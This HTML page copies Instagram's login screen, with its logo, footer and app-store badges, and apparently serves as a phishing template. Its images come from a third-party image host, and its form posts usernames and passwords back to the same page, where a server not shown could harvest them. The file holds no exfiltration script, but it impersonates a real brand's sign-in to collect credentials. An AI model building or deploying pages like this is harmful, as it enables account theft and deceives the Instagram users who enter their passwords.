<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Instagram - Log In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
        }
        
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin: 0 0 10px;
            width: 350px;
        }
        
        .logo {
            margin: 22px auto 12px;
            text-align: center;
        }
        
        .logo img {
            width: 175px;
        }
        
        form {
            margin-top: 24px;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            width: 100%;
        }
        
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            height: 32px;
            margin-top: 8px;
        }
        
        button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .fb-login img {
            margin-right: 8px;
            width: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            text-align: center;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin: 0 0 10px;
            width: 350px;
            text-align: center;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            margin: 20px 0;
            text-align: center;
        }
        
        .app-download p {
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
        }
        
        .app-stores img {
            height: 40px;
            margin: 0 4px;
        }
        
        footer {
            margin: 24px 0;
            text-align: center;
        }
        
        footer ul {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            list-style: none;
            margin-bottom: 16px;
        }
        
        footer li {
            margin: 0 8px 12px;
        }
        
        footer a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://i.ibb.co/LTqMQvZ/instagram-logo.png" alt="Instagram"/>
            </div>
            
            <form action="" method="post">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required=""/>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required=""/>
                </div>
                <button type="submit">Log In</button>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <a href="#" class="fb-login">
                    <img src="https://i.ibb.co/VWhXYNjd/facebook-logo.png" alt="Facebook logo"/>
                    Log in with Facebook
                </a>
                
                <div class="fb-login">
                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="signup-box">
            Don&#39;t have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="https://i.ibb.co/HWfVsp0/applestore-logo.png" alt="Download on the App Store"/>
                <img src="https://i.ibb.co/hzbGthX/googleplay-logo.png" alt="Get it on Google Play"/>
            </div>
        </div>
    </div>
    
    <footer>
        <ul>
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Top Accounts</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
        </ul>
        <div class="copyright">
            English Â© 2025 Instagram from Meta
        </div>
    </footer>
</body>
</html>
